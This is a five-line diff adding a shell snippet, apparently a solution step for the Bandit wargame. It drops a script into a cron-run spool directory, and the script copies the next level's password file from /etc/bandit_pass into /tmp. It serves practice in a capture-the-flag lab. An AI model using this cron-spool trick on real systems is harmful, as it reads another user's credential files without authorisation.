@@ -1,0 +1,5 @@
+cat <<'EOF'>> /var/spool/bandit24/blasted
+#!/bin/bash
+echo "Working" > /tmp/beef/fromblast
+cat /etc/bandit_pass/bandit24 > /tmp/beef/rested
+EOF
